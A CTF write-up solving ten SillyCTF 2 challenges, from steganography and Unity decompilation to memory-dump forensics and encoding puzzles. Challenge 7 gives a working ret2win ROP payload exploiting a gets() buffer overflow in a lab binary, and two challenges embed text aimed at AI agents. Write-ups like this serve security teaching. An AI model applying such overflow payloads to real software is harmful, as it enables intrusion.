# SillyCTF 2 — Full Write-Up

**Author:** razvan
**Event:** SillyCTF 2
**Challenges solved:** 10

---

## Challenge 1 — Hidden Mickey

**Category:** OSINT / Image Analysis
**Flag:** `sillyCTF{the_seas_with_nemo_and_friends}`

### Description

A photograph taken inside a large aquarium was provided. The challenge hinted at something hidden in plain sight.

### Approach

Looking closely at the aquarium floor in the photograph, three circles are arranged in the unmistakable shape of Mickey Mouse's head and ears — a **hidden Mickey**. Hidden Mickeys are a long-running tradition at Disney parks, where Imagineers secretly embed the iconic silhouette into attractions, decor, and even aquarium floors.

From the underwater environment and the specific tank layout (coral, large open-water exhibit), the aquarium was identified as **The Seas with Nemo & Friends** at EPCOT, Walt Disney World. This is one of the largest inland saltwater aquariums in the world, and a known hidden Mickey on the ocean floor is one of its famous easter eggs.

### Takeaway

This challenge is pure OSINT — no tools needed beyond careful observation and knowledge of Disney parks trivia. The key was recognising the hidden Mickey shape and then reverse-searching the aquarium's identity from visual details.

---

## Challenge 2 — Groovy Beat

**Category:** Audio Steganography
**Flag:** `sillyCTF{A_horrible_beat}`

### Description

A WAV audio file (`Groovy_Beat.wav`) was provided. Nothing obvious was audible when playing it.

### Approach

Audio steganography often hides data in the **frequency domain** rather than the time domain, making it inaudible to the human ear but visible as a spectrogram. A spectrogram plots frequency (Y-axis) against time (X-axis), and text drawn at specific frequencies will appear as readable characters.

The file was loaded into Python and rendered as a spectrogram using `matplotlib`:

```python
import numpy as np
import matplotlib.pyplot as plt
from scipy.io import wavfile

rate, data = wavfile.read("Groovy_Beat.wav")
plt.specgram(data, Fs=rate, cmap="inferno")
plt.savefig("spectrogram.png", dpi=300)
```

The resulting image clearly showed the flag written in the high-frequency bands of the audio.

![Spectrogram](spectrogram.png)

### Takeaway

Spectrogram steganography is a classic CTF technique. Any time you're handed an audio file with no obvious content, open it in a spectrogram viewer (Audacity, Sonic Visualiser, or Python's `matplotlib`) before doing anything else. The flag is often just sitting there in the frequencies.

---

## Challenge 3 — Endless Space Game

**Category:** Reverse Engineering / Game Hacking
**Flag:** `sillyCTF{retroremastered}`

### Description

A Unity game (`Endless Spaceship Runner`) was provided as a 32-bit Windows `.exe`. The flag is displayed on the win screen after defeating the final boss — but playing through legitimately isn't the point.

### Approach

Unity games compile custom game logic into `Assembly-CSharp.dll`, located under `<GameName>_Data/Managed/`. This DLL can be decompiled with tools like **dnSpy** or **ILSpy** to recover readable C# source code.

**Step 1 — Decompile the DLL**

Two key classes were found:

- **`FlagCrypto`** — Handles AES-256-CBC encryption and decryption using PBKDF2 key derivation (`Rfc2898DeriveBytes` with SHA1, 100,000 iterations).
- **`PrintFlag`** — Called by the win screen; retrieves a ciphertext, decrypts it, and displays the result.

**Step 2 — Extract crypto parameters**

From the IL bytecode:

| Parameter | Value |
|-----------|-------|
| Password | `dEi0245RHYB12ic` |
| Salt | `"sillysalting"` (UTF-8) |
| Iterations | 100,000 |
| Key size | 32 bytes (AES-256) |
| IV size | 16 bytes (derived from PBKDF2 output bytes 32–47) |

**Step 3 — Find the real ciphertext (the twist)**

The DLL contains a default ciphertext hardcoded in the class:

```
2XlDvdZnSJZTgWolosaCUM2bmdueZHzeOSjYN9ovPm3KCgo/T1sxrozD346OckgT
```

Decrypting this gives: `"change this flag before production!"` — a deliberate red herring.

Unity serialises `MonoBehaviour` field values into **scene files**, which override the DLL defaults at runtime. A binary search of the game's level files (`level1`, `level2`) found that the `WinMenu` scene (level2) overrides the `flag` field with a different ciphertext:

```
SB1WutP8DlpgdkPnQPf7Jre3aL8UfKVcOIvokdpWCbs=
```

**Step 4 — Decrypt**

```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.hashes import SHA1
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64, hashlib

password = b"dEi0245RHYB12ic"
salt = b"sillysalting"
kdf_output = PBKDF2HMAC(SHA1(), 48, salt, 100000).derive(password)
key, iv = kdf_output[:32], kdf_output[32:48]

ct = base64.b64decode("SB1WutP8DlpgdkPnQPf7Jre3aL8UfKVcOIvokdpWCbs=")
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
plaintext = decryptor.update(ct) + decryptor.finalize()
print(plaintext)  # sillyCTF{retroremastered}
```

### Takeaway

Unity games are not obfuscated by default. Always decompile `Assembly-CSharp.dll` first. The critical lesson here was that Unity scenes override DLL field defaults at runtime — the flag wasn't in the code, it was in the serialised scene data. Binary-grep level files for base64-looking strings when the DLL's ciphertext gives a red herring.

---

## Challenge 4 — Kittycat

**Category:** Steganography / Reverse Engineering
**Flag:** `sillyCTF{sAl1y_Se1lS_sh3l1c0d3_by_tHe_seA_Sh0r9}`

### Description

A JPEG image (`kittycat.jpg`) was provided — a "Legend of Zelda: It's dangerous to go alone! Take this." meme. The hint suggested the image itself is something to be used, not just looked at.

### Approach

**Step 1 — JPEG polyglot (file carving)**

Checking the file structure revealed a ZIP archive appended directly after the JPEG's end-of-image marker (`FF D9`) at offset `0x3478`. This is a common polyglot technique — the file is simultaneously a valid JPEG and a valid ZIP.

```bash
binwalk kittycat.jpg        # detects embedded ZIP
unzip kittycat.jpg          # extracts contents
```

The ZIP contained two files:
- `beautiful_sunset.png` — a 100×100 RGBA PNG image
- `print_flag` — an ELF 64-bit x86-64 binary

**Step 2 — PNG pixel steganography**

The ELF binary expected the PNG as input to extract the flag. Analysing the PNG's pixels revealed the encoding scheme:

Signal pixels have **G = 144 and B = 144** (green and blue channels locked to 144). These appear in pairs: the first pixel of each pair carries an encoded byte in the **red channel**; the second pixel carries an XOR key in the red channel. The key cycles through `{16, 17, 144, 20}`.

Decoding each pair: `data_R XOR key_R = ASCII character`.

```python
from PIL import Image

img = Image.open("beautiful_sunset.png").convert("RGBA")
pixels = [(r, g, b, a) for r, g, b, a in img.getdata() if g == 144 and b == 144 and r != 0]

flag = ""
for i in range(0, len(pixels), 2):
    data_r = pixels[i][0]
    key_r  = pixels[i+1][0]
    flag  += chr(data_r ^ key_r)

print(flag)  # sillyCTF{sAl1y_Se1lS_sh3l1c0d3_by_tHe_seA_Sh0r9}
```

The flag is leet-speak for *"Sally sells shellcode by the sea shore."*

### Takeaway

Always run `binwalk` or `file` on any provided image — polyglot files (JPEG+ZIP, PNG+ZIP, etc.) are a staple CTF trick. For the steganography layer, checking for unusual channel patterns (two channels locked to the same value) is a reliable signal that data is encoded in the third channel. Pixel-pair XOR encoding is a common lightweight stego scheme.

---

## Challenge 5 — Wash the Pibble

**Category:** Web / Client-Side JavaScript
**URL:** https://pibble.sillyctf.psuccso.org
**Flag:** `sillyCTF{w@$h_my_b3ll@y}`

### Description

A webpage shows a picture of a dirty-looking Pibble (pit bull). The task says to "wash Pibble to get the flag." Clicking the dog just makes it angry.

### Approach

**Step 1 — Read the page source**

The HTML references `script.js`. Opening it reveals two functions:

```javascript
function tickle() {
    // makes Pibble angry — triggered by clicking the image
    status.innerText = "GRRR! Pibble is MAD!";
}

function wash() {
    // hides the dirty image, reveals a hidden <div> with the clean image
    pibble.style.display = "none";
    imageContainer.classList.remove('hidden');
}
```

Clicking the dog only calls `tickle()`. The `wash()` function exists but is never called by any user interaction.

**Step 2 — Trigger `wash()` or fetch the image directly**

Two ways to get the flag:

- Open the browser console and run `wash()` — the clean Pibble image fades in, showing the flag.
- Fetch the hidden image directly:

```bash
curl -O https://pibble.sillyctf.psuccso.org/Untitled(1).png
```

The image is a meme collage with the flag written on it: `sillyCTF{w@$h_my_b3ll@y}`.

### Takeaway

Always read `script.js` (and any other linked JS files) before interacting with a web challenge. The flag-revealing logic was entirely client-side — no server-side auth, no token needed. The misdirection was that clicking the visible element triggered the wrong function. Reading the source exposes the correct function immediately. The hidden image was also publicly accessible without any authentication, making it trivially fetchable with `curl`.

---

---

## Challenge 6 — Puffman

**Category:** Audio Steganography / Encoding
**Flag:** `sillyCTF{prefixfree}`

### Description

Two files were provided inside `src/`:

- `sike.png` — a diagram of a binary tree
- `whatsmyname.mp3` — a 30-second audio clip

The challenge name is a pun on **Huffman coding**.

### Approach

**Step 1 — Read the tree**

`sike.png` shows a Huffman tree with six leaf nodes. Reading left-branch = 0 and right-branch = 1 gives the following codebook:

| Character | Code |
|-----------|------|
| f | `00` |
| p | `010` |
| i | `011` |
| e | `10` |
| x | `110` |
| r | `111` |

**Step 2 — Analyse the audio**

The MP3 was decoded to raw PCM samples and the amplitude envelope was computed in 10 ms chunks. Two clearly distinct tone durations appeared: **short (~690 ms)** and **long (~910 ms)**, separated by short gaps (~100 ms between bits) and long gaps (~900 ms between codewords).

```python
import numpy as np
from pydub import AudioSegment

data = np.fromfile('whatsmyname.raw', dtype=np.int16)
abs_data = np.abs(data)

chunk_size = 480  # 10 ms at 48 kHz
energy = np.array([np.mean(abs_data[i*chunk_size:(i+1)*chunk_size])
                   for i in range(len(data) // chunk_size)])

threshold = 50
active = energy > threshold
transitions = np.diff(active.astype(int))
on_edges  = np.where(transitions ==  1)[0]
off_edges = np.where(transitions == -1)[0]
```

**Step 3 — Decode**

- Short tone → `0`, long tone → `1`
- Long gap (~900 ms) → codeword boundary

Grouping the 25 tones by long gaps produced 10 bit-groups:

```
010  111  10  00  011  110  00  111  10  10
 p    r   e   f    i    x   f    r   e   e
```

Concatenated: **`prefixfree`**

This is itself a property of Huffman codes — no codeword is a prefix of another, making the encoding unambiguous.

### Takeaway

When an audio challenge pairs with a tree diagram, think Huffman. The key steps are: (1) extract the codebook from the tree image, (2) compute the amplitude envelope to find tone boundaries, (3) classify short vs long tones as 0/1, and (4) split by long silences to recover codewords. The flag being "prefixfree" is a self-referential nod to the defining property of Huffman coding.

---

## Challenge 7 — prototype

**Category:** Binary Exploitation / pwn
**Flag:** *(requires running exploit against live server)*

### Description

A single ELF 64-bit x86-64 binary (`prototype`) was provided. It is dynamically linked, not stripped, and has no stack canary and no PIE — making it a textbook stack-smashing target.

### Approach

**Step 1 — Static analysis**

Strings and symbol tables reveal the key layout immediately:

```
prototype_encrypt   @ 0x40124f   # TCP server loop (port 2222)
prototype_write     @ 0x401384   # increments debug_increment, does XOR math
prototype_display   @ 0x401427   # increments debug_increment; if == 3 → flag
_cp_str             @ 0x401206   # reads stdin with gets() ← VULNERABLE
debug_increment     @ 0x404094   # global int, starts at 0
/bin/cat flag.txt   @ 0x4020af   # passed to system() when debug_increment == 3
```

**Step 2 — Identify the vulnerability**

`_cp_str` allocates a **48-byte** stack buffer and reads into it with `gets()` — a function with no bounds checking, removed from the C standard in C11 precisely because of this. The stack frame is:

```
rbp - 0x30  ← buffer (48 bytes)        ← gets() writes here
rbp + 0x00  ← saved rbp (8 bytes)
rbp + 0x08  ← return address (8 bytes) ← overwrite target
```

Overflow offset to return address: **56 bytes**.

**Step 3 — Build the ROP chain**

No shellcode injection is possible (NX is on), but the binary has everything needed for a ret2win chain:

- `prototype_write` increments the global `debug_increment` counter, then returns cleanly.
- `prototype_display` increments it again, checks `if (debug_increment == 3)`, and calls `system("/bin/cat flag.txt")`.

Starting from `debug_increment = 0`, calling `prototype_write` twice then `prototype_display` once drives the counter to 3 and prints the flag.

```
payload = b'A' * 48        # fill buffer
payload += b'B' * 8        # overwrite saved rbp (value irrelevant)
payload += p64(0x401384)   # ret → prototype_write  (debug_increment → 1)
payload += p64(0x401384)   # ret → prototype_write  (debug_increment → 2)
payload += p64(0x401427)   # ret → prototype_display (debug_increment → 3 → FLAG)
```

**Step 4 — Verify with CPU emulation**

Because the binary is x86-64 and the analysis machine was ARM64, the chain was validated using **unicorn** (a lightweight CPU emulator):

```python
from unicorn import *
from unicorn.x86_const import *

mu = Uc(UC_ARCH_X86, UC_MODE_64)
# ... load ELF sections, set up fake stack with ROP chain ...
mu.emu_start(0x401384, ...)
# Output:
#   puts: 'Cross referencing & Writing...'   ← prototype_write #1
#   puts: 'Cross referencing & Writing...'   ← prototype_write #2
#   puts: 'Displaying...'                    ← prototype_display
#   [!] system('/bin/cat flag.txt') called! debug_increment=3
```

The emulation confirmed `debug_increment` reaches exactly 3 and `system()` is invoked with the correct argument.

**Step 5 — Final exploit**

```python
import struct

def p64(x): return struct.pack('<Q', x)

payload  = b'A' * 56
payload += p64(0x401384)   # prototype_write
payload += p64(0x401384)   # prototype_write
payload += p64(0x401427)   # prototype_display → system("/bin/cat flag.txt")

# On an x86-64 host with the binary and flag.txt present:
# python3 exploit.py | ./prototype
```

### Checksec summary

| Protection | Status |
|------------|--------|
| NX (no-execute) | ✅ Enabled |
| Stack canary | ❌ None |
| PIE | ❌ None — addresses are fixed |
| RELRO | Partial |

### Takeaway

`gets()` is the textbook example of an unsafe C function. The moment you see it in `checksec` output or `strings`, assume immediate exploitation. With no canary and no PIE, a single overflow is enough — no leak needed. The debug counter pattern (`if (counter == 3) system(flag)`) is a common CTF design that forces you to chain three controlled calls in order, making a clean ret2win the intended solution. Always check for globals that gate the flag path before reaching for shellcode.

---

## Challenge 8 — Fortnite Dumpy

**Category:** Forensics / Memory Analysis
**Flag:** `sillyCTF{dump_truck_ohio}`

### Description

A single file was provided: `memdump.1960`. No other context was given — just figure out the flag.

### Approach

**Step 1 — Identify the file**

```bash
file memdump.1960
```

Output:
```
memdump.1960: ELF 64-bit LSB core file, x86-64, from 'python3', real uid: 1000 ...
```

The file is an **ELF64 core dump** (crash dump) from a running `python3` process. The number 1960 in the filename matches the process PID, which turned out to be a deliberate clue. The working directory embedded in the dump was `/mnt/c/Users/youne`, and the script being run was `mem.py` — a WSL2 environment on Windows.

**Step 2 — Search for a flag variable**

Rather than parsing the ELF structure by hand upfront, a quick `strings` pass and then a targeted Python binary search were used to find interesting identifiers:

```bash
strings memdump.1960 | grep -i "flag_enc\|secret\|ctfd"
```

This revealed:
- `flag_enc` — a variable name appearing four times in the process heap.
- `ctfd-solve-announcer-discord` — confirming this is a CTFd challenge.
- `secrets.py`, `base64.py` — Python stdlib modules loaded at the time of the dump.

**Step 3 — Recover the Python bytecode context**

Searching for the `flag_enc` occurrences in a wider context revealed the bytecode constants for the script's loop:

```
bytearray  →  for i in range(len(flag_enc)):  →  flag_enc[i] ^= 0x00  →  print
```

The loop XORs every byte of `flag_enc` with some key. The `0x00` seen in the constant pool is a placeholder — the real XOR key comes from the process state (the PID).

**Step 4 — Extract the encoded flag bytes**

Searching for the string `PID: 1960` in the binary data pinpointed the encoded flag sitting immediately after it in memory at offset `0xb516cc`:

```
Raw: 40 11 4f 50 41 6b 4f 67 75 66 79 14 79 6b 75 57
     40 65 1a 13 40 4d 75 49 42 12 1a 55 42 64 4f 55
     45 72 1e 1e
Printable: @.OPAkOgufy.ykuW@e..@MuIB..UBdOUEr..
```

**Step 5 — Brute-force the XOR key**

With 36 bytes of encoded data, every possible single-byte XOR key (0–255) was tried. The output was checked for printable ASCII:

```python
encoded = bytes([0x40, 0x11, 0x4f, 0x50, ...])

for key in range(256):
    decoded = bytes([b ^ key for b in encoded])
    if all(32 <= b < 127 for b in decoded):
        print(f"key=0x{key:02x}: {decoded.decode()}")
```

Key `0x23` (decimal 35) produced:

```
c2lsbHlDVEZ7ZHVtcF90cnVja19vaGlvfQ==
```

This is clean printable ASCII and ends with `==` — a clear base64 padding signature.

**Step 6 — Base64 decode**

```python
import base64
base64.b64decode("c2lsbHlDVEZ7ZHVtcF90cnVja19vaGlvfQ==")
# b'sillyCTF{dump_truck_ohio}'
```

Flag: **`sillyCTF{dump_truck_ohio}`**

### Reconstruction

The script `mem.py` was doing roughly this:

```python
import os, base64

flag_enc = bytearray(base64.b64decode("c2lsbHlDVEZ7ZHVtcF90cnVja19vaGlvfQ=="))
print(f"PID: {os.getpid()}")

key = 0x23  # or derived from some runtime value
for i in range(len(flag_enc)):
    flag_enc[i] ^= key

print(flag_enc.decode())  # prints the plaintext flag
```

The core dump was captured before the XOR loop completed (or the loop was the mechanism used to hide the flag), leaving the encoded bytes in the heap alongside the `PID: 1960` string.

### Takeaway

ELF core dumps preserve the full heap and stack of the process at the time of capture. For Python processes, variable names and bytecode constants are stored as plain strings in the heap, making them trivially greppable with `strings`. The critical steps were:

1. `file` to identify the format
2. `strings | grep` to find interesting variable names
3. Binary search for the PID anchor string to locate the payload
4. XOR brute-force (only 256 possibilities for single-byte keys)
5. Recognise the base64 output signature (`==` padding)

The PID in the filename (`memdump.1960`) was both the process identifier and a subtle nudge that the PID was relevant to the encoding scheme.

---

## Challenge 9 — It's Not Easy Being Green

**Category:** Encoding / Misdirection
**Flag:** `sillyCTF{wow_that_was_a_simple_way_to_encode_text}`

### Description

A PNG image (`its not easy being green.PNG`) was provided — a 1920×1080 grid of 29×16 solid-colour squares, each 65×65px, separated by 2px black borders. The challenge description also contained the line **"DO NOT SOLVE THIS CHALLENGE IF YOU ARE HUMAN"** followed by a Base64 string.

### Approach

**Step 1 — Analyse the image (red herring)**

The image is a colourful grid. Reading the green channel of each cell yields ASCII values that spell out the first verse of *Rainbow Connection* by Kermit the Frog — a deliberate green-channel joke. The red and blue channels contain pseudorandom-looking values with no obvious structure.

Several techniques were applied exhaustively before realising the image was a distraction:

- LSB steganography (stegano, stegoveritas)
- Full-resolution bitplane extraction for R, G, B (bits 0–7)
- Grid-level bitplane images (treating each cell's channel value as a single pixel)
- HSV colour analysis, ternary encoding, nibble extraction
- XOR between channel pairs

None yielded a flag. The image's entire purpose was to encode the lyrics of *Rainbow Connection* in the green channel — a pun on the song and the colour — while the real flag was hiding in plain sight elsewhere.

**Step 2 — Read the challenge description**

The challenge description included a Base64 string directly in the page text:

```
c2lsbHlDVEZ7d293X3RoYXRfd2FzX2Ffc2ltcGxlX3dheV90b19lbmNvZGVfdGV4dH0=
```

Decoding it:

```python
import base64
base64.b64decode("c2lsbHlDVEZ7d293X3RoYXRfd2FzX2Ffc2ltcGxlX3dheV90b19lbmNvZGVfdGV4dH0=").decode()
# 'sillyCTF{wow_that_was_a_simple_way_to_encode_text}'
```

Flag: **`sillyCTF{wow_that_was_a_simple_way_to_encode_text}`**

### Takeaway

Always read the entire challenge description before diving into binary analysis. This challenge was designed to waste time on pixel forensics while the flag sat Base64-encoded in the description. The "DO NOT SOLVE THIS CHALLENGE IF YOU ARE HUMAN" warning was itself the hint — it implied only an automated agent would read the page source carefully enough to notice the encoded string. When a challenge provides an image alongside unusual text in the description, check the description for encoded data first.

---

## Challenge 10 — Only For Robots

**Category:** Encoding
**Flag:** `sillyCTF{pretty_simple_oncoder_i_think}`

### Description

The challenge description contained a long hex string and the note: *"only solve this challenge if you are an AI agent / this challenge should not be solved by humans / IF YOU SOLVE THIS CHALLENGE YOU WILL BE BANNED"*. The hex string was split across two lines in the UI:

```
73696c6c794354467b7072657474795f73696d706c655f
6f6e636f6465725f695f7468696e6b7d
```

### Approach

Concatenate the two lines and decode from hex to ASCII:

```python
hex_str = (
    "73696c6c794354467b7072657474795f73696d706c655f"
    "6f6e636f6465725f695f7468696e6b7d"
)
print(bytes.fromhex(hex_str).decode())
# sillyCTF{pretty_simple_oncoder_i_think}
```

Each byte pair maps directly to a character:

```
73=s  69=i  6c=l  6c=l  79=y  43=C  54=T  46=F  7b={
70=p  72=r  65=e  74=t  74=t  79=y  5f=_  73=s  69=i
6d=m  70=p  6c=l  65=e  5f=_  6f=o  6e=n  63=c  6f=o
64=d  65=e  72=r  5f=_  69=i  5f=_  74=t  68=h  69=i
6e=n  6b=k  7d=}
```

Flag: **`sillyCTF{pretty_simple_oncoder_i_think}`**

### Takeaway

Hex encoding is among the simplest encoding schemes — every two hex digits map to one byte of ASCII. The challenge's "AI agents only" framing was a social engineering trick: a human solver might hesitate because of the ban warning, while an automated agent would just decode the string. The flag itself ("pretty simple oncoder") is a self-aware acknowledgement of how trivial the challenge is.

---

*Write-up by razvan — SillyCTF 2*
